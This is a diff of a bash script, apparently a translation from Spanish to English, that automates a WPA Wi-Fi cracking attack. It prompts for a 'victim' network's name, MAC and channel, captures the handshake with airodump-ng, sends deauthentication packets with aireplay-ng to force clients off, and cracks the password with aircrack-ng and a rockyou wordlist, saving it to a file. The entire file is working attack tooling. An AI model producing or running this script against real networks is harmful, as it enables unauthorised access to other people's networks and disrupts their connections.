@@ -2,41 +2,41 @@
 export TERM=xterm
 trap ctrl_c INT
 function ctrl_c(){
-	echo -e " Saliendo..."
+	echo -e " Exiting..."
 
 	./src/reset.sh monitor
 	exit 0
 }
 
-interfaz=$(/bin/cat ./content/interfaz)
+interface=$(/bin/cat ./content/interface)
 
-function configurar_interfaz(){
-	echo -e "\n. . . . Matando los procesos que puedan interferir"
+function configure_interface(){
+	echo -e "\n. . . . Killing processes that may interfere"
 	systemctl stop wpa_supplicant NetworkManager
 	sleep 1
-	echo -e ". . . . Poniendo la interfaz $interfaz en modo monitor\n"
-	airmon-ng start $interfaz > /dev/null 2>&1
+	echo -e ". . . . Putting interface $interface in monitor mode\n"
+	airmon-ng start $interface > /dev/null 2>&1
 	sleep 0.5
-	iw dev | awk '/Interface/ {iface=$2} /type monitor/ {print iface}' > ./content/interfaz
-	moninterface=$(/bin/cat ./content/interfaz)
-	echo -e "\nInterfaz $moninterface creada\n"
+	iw dev | awk '/Interface/ {iface=$2} /type monitor/ {print iface}' > ./content/interface
+	moninterface=$(/bin/cat ./content/interface)
+	echo -e "\nInterface $moninterface created\n"
 	sleep 1
 }
 
-##############################    datos    ########################################################
+##############################    data    ########################################################
 
-function datos_wifi(){
-	echo -ne "\n -  Ahora se va a ejecutar un comando en una ventana nueva que te mostrara la redes disponibles\n -  Cuando introduzca todos los datos cierre la ventana\n"
+function wifi_data(){
+	echo -ne "\n -  A command will now run in a new window showing the available networks\n -  When you have entered all the data, close the window\n"
 	sleep 1
-	echo -ne "\nPresione cualquier tecla para continuar\n"
+	echo -ne "\nPress any key to continue\n"
 	while true; do
-		read -n 1 -t 0.1 tecla && break
+		read -n 1 -t 0.1 key && break
 	done
 	xterm -hold -e "airodump-ng $moninterface" &
-	echo -ne "\nEspecifique el ESSID (nombre) tal cual de la red victima: " && read -r victim_essid
-	echo -ne "\nDireccion MAC de la red victima: " && read -r victim_mac
-	echo -ne "\nCanal de la red victima: " && read -r victim_chan
-	echo -ne "\nEspecifique una wordlist para crakear la contraseña (rockyou por defecto): " && read -r wordlist
+	echo -ne "\nSpecify the ESSID (name) of the target network exactly: " && read -r victim_essid
+	echo -ne "\nMAC address of the target network: " && read -r victim_mac
+	echo -ne "\nChannel of the target network: " && read -r victim_channel
+	echo -ne "\nSpecify a wordlist to crack the password (rockyou by default): " && read -r wordlist
 	if [ "$wordlist" == "" ]; then
 		wordlist=$(locate rockyou.txt | grep -v .gz | head -n 1)
 	fi
@@ -46,37 +46,37 @@ function datos_wifi(){
 
 }
 
-##############################    Ataque    ##########################################
+##############################    Attack    ##########################################
 
-function pass_attack(){
-	echo -e "\n. . . . Iniciando el ataque\n"; sleep 1
-	echo -e " -  Ahora se abrira otra ventana, presione cualquier tecla para continuar\n"; sleep 2
+function password_attack(){
+	echo -e "\n. . . . Starting the attack\n"; sleep 1
+	echo -e " -  Another window will open, press any key to continue\n"; sleep 2
 	while true; do
-		read -n 1 -t 0.1 tecla && break
+		read -n 1 -t 0.1 key && break
 	done
-	echo -e ". . . . Capturando el handshake"
-	xterm -hold -e "airodump-ng --essid $victim_essid -c $victim_chan --write data/handshake $moninterface 2>/dev/null || airodump-ng --bssid $victim_mac -c $victim_chan --write data/handshake $moninterface" &
+	echo -e ". . . . Capturing the handshake"
+	xterm -hold -e "airodump-ng --essid $victim_essid -c $victim_channel --write data/handshake $moninterface 2>/dev/null || airodump-ng --bssid $victim_mac -c $victim_channel --write data/handshake $moninterface" &
 	sleep 3
-	echo -e ". . . . Lanzando paquetes de desautenticacion"
+	echo -e ". . . . Sending deauthentication packets"
 	aireplay-ng --deauth 10 -a $victim_mac $moninterface > /dev/null 2>&1
 	sleep 5
 	pid=$(ps | grep xterm | awk '{print $1}')
 	kill $pid > /dev/null 2>&1
-	echo -e ". . . . Crackeando el handshake, esto puede llevar un buen rato"
+	echo -e ". . . . Cracking the handshake, this may take a while"
 	sleep 3
 	xterm -hold -e "aircrack-ng data/handshake*.cap -w $wordlist -l password.txt; sleep 3; exit"
 #	aircrack-ng content/handshake*.cap -w $wordlist > password.txt
-	echo -e "\nAtaque terminado, la contraseña se ha guardado en password.txt"
+	echo -e "\nAttack finished, the password has been saved to password.txt"
 	sleep 5
 	ctrl_c
 }
 
-################################    Inicio del programa    #############################
+################################    Program start    #############################
 
 clear
-configurar_interfaz
-datos_wifi
-pass_attack
+configure_interface
+wifi_data
+password_attack
 
 
 
